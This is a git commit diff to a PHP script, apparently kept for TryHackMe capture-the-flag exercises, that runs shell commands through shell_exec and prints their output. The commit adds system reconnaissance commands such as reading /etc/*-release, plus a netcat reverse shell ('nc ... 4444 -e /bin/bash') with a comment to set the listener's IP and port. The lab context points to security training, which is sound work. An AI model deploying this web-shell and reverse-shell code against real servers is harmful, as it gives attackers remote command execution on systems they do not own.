9c2016a23300cd3dddd42ff2f98c687b35f2a0a4
Jean Andrew Fuentes <jeanandrewfuentes@gmail.com>
2023-04-16 16:46:19 +0800

    Update command injection

--- TryHackMe/scripts/command-injection.php
+++ TryHackMe/scripts/command-injection.php
@@ -1,13 +1,15 @@
 <?php
 
 function executeCommand($command) {
-    $output = shell_exec($command);
+    $output = shell_exec("$command  2>&1");
     echo "<pre>$command\n$output</pre>";
 }
 
-executeCommand('sudo systemctl status ufw');
 executeCommand('whoami');
-executeCommand('ls -altr');
 executeCommand('pwd');
+executeCommand('ls -altr');
+executeCommand('cat /etc/*-release');
 
+// CHANGE TO IP AND PORT OF LISTNER MACHINE
+executeCommand('nc 1.1.1.1 4444 -e /bin/bash');
 ?>
